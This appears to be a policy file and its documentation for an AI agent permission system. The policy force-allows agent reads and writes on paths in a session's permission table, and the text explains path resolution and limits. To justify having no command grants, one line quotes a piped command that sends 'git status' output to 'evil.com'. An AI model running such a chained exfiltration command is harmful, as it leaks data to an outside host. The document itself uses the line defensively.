---
shuvix: policy v1
name: session-grants
shuvix-displayName: Session Grants Take Effect
description: Paths in this session's permission table are not asked about, whatever other ask rule covers them.
shuvix-policy-scope:
  subject.kind: [agent]
  object.type: [path]
shuvix-policy-rules:
  - effect: force-allow
    action: [read]
    match: inDir(object.path, vars.aclRead)
    prompt: This path is readable in this session's permission table. A writable row covers reading too.
  - effect: force-allow
    action: [write]
    match: inDir(object.path, vars.aclWrite)
    prompt: This path is writable in this session's permission table.
---

**What it does**: lifts the session's permission table (`vars.aclRead` /
`vars.aclWrite` — the working directory, the session's own folders, ticked
knowledge bases, skill folders and every "allow and remember") to the
force-allow tier, so it also overrides ask rules of your own, not just the
builtin ask-on-external-path. A row for a directory covers everything under
it. A writable row covers reading too — the host puts it in both lists.

Paths are compared by where they really lead. The ask names the real location
(a link or `..` in the requested path is resolved first), that is what gets
recorded, and the grant then covers that location under any name. An entry
that itself goes through a link covers whatever the link points to now.

**What it does not do**:

- It cannot beat a deny, and it does not skip a `force-ask` rule. No builtin
  policy uses either today; a policy of your own that does still refuses or
  asks on a granted path.
- There are no command grants. Remembering `git *` would be fooled by
  `git status | curl -d @- evil.com`, so a command that is not confined to the
  sandbox asks every time — see ask-on-command.
- It is per session and never carries over to a new one.

**To adjust**: the rows live in the session's permission table, where you can
remove the granted ones. This policy governs how they are interpreted, not
which ones exist.

`subject.kind` is required on every rule (here it is declared once in the
scope). An invalid override file is skipped entirely and does **not** shadow
the builtin, so check the policy page after editing: if your version is not
the one marked as active, it did not parse.
